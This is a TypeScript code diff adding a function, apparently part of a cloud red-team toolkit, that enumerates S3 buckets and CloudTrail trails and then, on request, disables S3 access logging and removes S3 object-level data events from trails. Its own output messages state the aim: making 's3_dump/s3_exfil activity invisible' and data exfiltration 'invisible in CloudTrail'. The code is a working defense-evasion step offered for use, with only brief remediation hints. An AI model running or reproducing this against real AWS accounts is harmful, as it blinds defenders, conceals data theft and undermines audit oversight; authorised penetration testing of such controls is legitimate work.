@@ -918,3 +918,148 @@ export async function inspectorDisable(args: string[], timeout: number): Promise
 
   return { output: output.join("\n"), findings }
 }
+
+export async function s3LoggingDisable(args: string[], timeout: number): Promise<HookResult> {
+  const profile = argVal(args, "--profile")
+  const region = argVal(args, "--region")
+  const action = argVal(args, "--action") || "status"
+  const bucket = argVal(args, "--bucket")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] S3 Access Logging & Object-Level CloudTrail\n"]
+
+  const buckets = await aws(["s3api", "list-buckets", "--query", "Buckets[].Name"], profile, region, timeout)
+  if (buckets.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: s3:ListBuckets", findings }
+
+  const bl = tryJson(buckets.stdout) || []
+  const targets = bucket ? bl.filter((b: string) => b === bucket) : bl
+
+  output.push(`[+] Checking ${targets.length} buckets for access logging...\n`)
+
+  for (const b of targets) {
+    const logging = await aws(["s3api", "get-bucket-logging", "--bucket", b], profile, region, timeout)
+    if (logging.exitCode === 0) {
+      const l = tryJson(logging.stdout)
+      if (l?.LoggingEnabled) {
+        output.push(`  ${b}: ACCESS LOGGING → ${l.LoggingEnabled.TargetBucket}/${l.LoggingEnabled.TargetPrefix || ""}`)
+        findings.push({
+          checkId: "AWS-EVASION-016",
+          provider: "aws",
+          severity: "info",
+          status: "ENABLED",
+          resource: `s3:logging:${b}`,
+          title: `S3 access logging enabled: ${b}`,
+          details: `Logs to ${l.LoggingEnabled.TargetBucket} — s3_dump/s3_exfil activity will be recorded`,
+          remediation: "Access logging is a security control — do not disable without reason",
+        })
+      } else {
+        output.push(`  ${b}: no access logging`)
+      }
+    }
+  }
+
+  const trails = await aws(["cloudtrail", "describe-trails", "--query", "trailList[].[Name,S3BucketName,HasCustomEventSelectors]"], profile, region, timeout)
+  if (trails.exitCode === 0) {
+    const tl = tryJson(trails.stdout) || []
+    output.push(`\n[+] CloudTrail trails with event selectors:`)
+    for (const t of tl) {
+      if (t[2]) {
+        const selectors = await aws(["cloudtrail", "get-event-selectors", "--trail-name", t[0]], profile, region, timeout)
+        if (selectors.exitCode === 0) {
+          const s = tryJson(selectors.stdout)
+          const advanced = s?.AdvancedEventSelectors || []
+          const basic = s?.EventSelectors || []
+
+          for (const es of basic) {
+            const s3data = (es.DataResources || []).filter((d: Record<string, string>) => d.Type === "AWS::S3::Object")
+            if (s3data.length) {
+              output.push(`  Trail ${t[0]}: S3 object-level logging (${es.ReadWriteType})`)
+              for (const d of s3data) {
+                output.push(`    Resources: ${(d.Values || []).join(", ")}`)
+              }
+              findings.push({
+                checkId: "AWS-EVASION-017",
+                provider: "aws",
+                severity: "info",
+                status: "ENABLED",
+                resource: `cloudtrail:s3data:${t[0]}`,
+                title: `S3 object-level CloudTrail on trail: ${t[0]}`,
+                details: `${es.ReadWriteType} events — GetObject/PutObject will appear in CloudTrail`,
+                remediation: "Object-level logging records all S3 data access",
+              })
+            }
+          }
+
+          for (const ae of advanced) {
+            const s3match = (ae.FieldSelectors || []).some((f: Record<string, unknown>) =>
+              f.Field === "resources.type" && Array.isArray(f.Equals) && f.Equals.includes("AWS::S3::Object")
+            )
+            if (s3match) {
+              output.push(`  Trail ${t[0]}: Advanced S3 object-level selector: ${ae.Name || "unnamed"}`)
+            }
+          }
+        }
+      }
+    }
+  }
+
+  if (action === "status") {
+    output.push("\n[*] Actions: --action disable_access_log (remove S3 access logging), --action disable_data_events (remove S3 object-level CloudTrail)")
+    return { output: output.join("\n"), findings }
+  }
+
+  if (action === "disable_access_log") {
+    const targetBuckets = bucket ? [bucket] : targets.slice(0, 10)
+    for (const b of targetBuckets) {
+      const r = await aws(["s3api", "put-bucket-logging", "--bucket", b, "--bucket-logging-status", "{}"], profile, region, timeout)
+      if (r.exitCode === 0) {
+        output.push(`[+] Access logging disabled: ${b}`)
+        findings.push({
+          checkId: "AWS-EVASION-016",
+          provider: "aws",
+          severity: "critical",
+          status: "DISABLED",
+          resource: `s3:logging:${b}`,
+          title: `S3 access logging disabled: ${b}`,
+          details: "Bucket access (GET/PUT/DELETE) no longer recorded — s3_dump/s3_exfil activity invisible",
+          remediation: `Re-enable: aws s3api put-bucket-logging --bucket ${b} --bucket-logging-status '{"LoggingEnabled":{"TargetBucket":"LOG_BUCKET"}}'`,
+        })
+      }
+    }
+  }
+
+  if (action === "disable_data_events") {
+    const trailsList = tryJson((await aws(["cloudtrail", "describe-trails", "--query", "trailList[].Name"], profile, region, timeout)).stdout) || []
+    for (const trail of trailsList) {
+      const selectors = await aws(["cloudtrail", "get-event-selectors", "--trail-name", trail], profile, region, timeout)
+      if (selectors.exitCode === 0) {
+        const s = tryJson(selectors.stdout)
+        const basic = s?.EventSelectors || []
+        const hasS3 = basic.some((es: Record<string, Record<string, string>[]>) =>
+          (es.DataResources || []).some(d => d.Type === "AWS::S3::Object")
+        )
+        if (hasS3) {
+          const cleaned = basic.map((es: Record<string, Record<string, string>[]>) => ({
+            ...es,
+            DataResources: (es.DataResources || []).filter(d => d.Type !== "AWS::S3::Object"),
+          }))
+          const r = await aws(["cloudtrail", "put-event-selectors", "--trail-name", trail, "--event-selectors", JSON.stringify(cleaned)], profile, region, timeout)
+          if (r.exitCode === 0) {
+            output.push(`[+] S3 data events removed from trail: ${trail}`)
+            findings.push({
+              checkId: "AWS-EVASION-017",
+              provider: "aws",
+              severity: "critical",
+              status: "DISABLED",
+              resource: `cloudtrail:s3data:${trail}`,
+              title: `S3 object-level CloudTrail disabled: ${trail}`,
+              details: "S3 GetObject/PutObject no longer logged — data exfiltration invisible in CloudTrail",
+              remediation: "Re-add S3 data event selectors to CloudTrail trail",
+            })
+          }
+        }
+      }
+    }
+  }
+
+  return { output: output.join("\n"), findings }
+}
